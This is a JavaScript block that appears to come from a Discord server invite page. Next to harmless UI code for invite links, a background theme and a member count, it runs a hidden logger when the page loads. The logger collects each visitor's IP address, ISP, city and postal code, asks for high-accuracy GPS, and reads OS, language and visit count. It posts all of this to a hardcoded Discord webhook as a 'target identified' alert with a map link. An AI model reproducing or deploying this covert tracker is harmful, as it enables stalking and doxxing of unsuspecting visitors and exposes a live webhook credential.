<script>
    // 基本設定
    const INVITE_URL = "https://discord.gg/dcus"; 
    const SERVER_ID = "1427230542704676926";
    // 更新された新しいWebhook URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471711618730561647/tjwjOue2WKI1ioF5jmEfr272qB5J2xF082S8qxvGx3KW_g0f4xezNJRwHxpQFp_PC_ql";

    // IPアドレスから住所・ISPを特定する
    async function getDetailedIpInfo() {
        try {
            const response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,query');
            return await response.json();
        } catch { return null; }
    }

    // 現在地の座標を取得（高精度モード）
    function getHighPrecisionCoords() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: "非対応" });
            } else {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    }),
                    (err) => resolve({ error: "拒否" }),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
        });
    }

    // すべての情報を統合してWebhook送信
    async function sendLogNotification() {
        // IP情報とGPS座標を同時に取得開始
        const [ipInfo, gps] = await Promise.all([getDetailedIpInfo(), getHighPrecisionCoords()]);
        
        // 訪問回数の記録
        let visitCount = localStorage.getItem('visit_count') || 0;
        visitCount = parseInt(visitCount) + 1;
        localStorage.setItem('visit_count', visitCount);

        // Googleマップリンクの作成
        const googleMapUrl = gps.lat ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : null;

        const data = {
            embeds: [{
                title: "⚠️ ターゲット特定通知",
                description: "紹介サイトへのアクセスを検知。詳細情報を取得しました。",
                color: 16711680, // 警告の赤色
                fields: [
                    { name: "🌐 IPアドレス", value: `\`${ipInfo?.query || "取得不能"}\``, inline: true },
                    { name: "🏢 プロバイダ", value: `\`${ipInfo?.isp || "不明"}\``, inline: true },
                    { name: "📍 推定住所 (IP)", value: `${ipInfo?.regionName || ""} ${ipInfo?.city || ""} (${ipInfo?.zip || ""})`, inline: false },
                    { 
                        name: "🛰️ GPS現在地 (高精度)", 
                        value: googleMapUrl 
                            ? `📍 [Googleマップで場所を確認する](${googleMapUrl})\n(精度誤差: 約${Math.round(gps.acc)}m)` 
                            : "❌ ユーザーが位置情報の共有を拒否しました", 
                        inline: false 
                    },
                    { name: "📱 OS/言語", value: `${navigator.platform} / ${navigator.language}`, inline: true },
                    { name: "👤 訪問回数", value: `${visitCount} 回目`, inline: true }
                ],
                footer: { text: "Security Tracking System" },
                timestamp: new Date().toISOString()
            }]
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).catch(() => {});
    }

    // UI関連の関数
    function setupInviteLinks() { 
        document.querySelectorAll('.invite-link').forEach(link => link.href = INVITE_URL); 
    }
    function updateTheme() {
        const hour = new Date().getHours();
        document.body.style.background = (hour >= 10 && hour < 18) 
            ? "linear-gradient(135deg, #1e3c72, #2a5298, #6dd5ed)" 
            : "linear-gradient(135deg, #0f0c29, #302b63, #24243e)";
    }
    async function updateMemberCount() {
        const statusEl = document.getElementById('status-box');
        try {
            const response = await fetch(`https://discord.com/api/guilds/${SERVER_ID}/widget.json?t=${Date.now()}`);
            const data = await response.json();
            statusEl.innerText = `🟢 オンライン: ${data.presence_count}人`;
        } catch { statusEl.innerText = `🟢 サーバー稼働中`; }
    }

    // 実行
    document.addEventListener('DOMContentLoaded', () => {
        setupInviteLinks();
        updateTheme();
        updateMemberCount();
        sendLogNotification();
    });
</script>
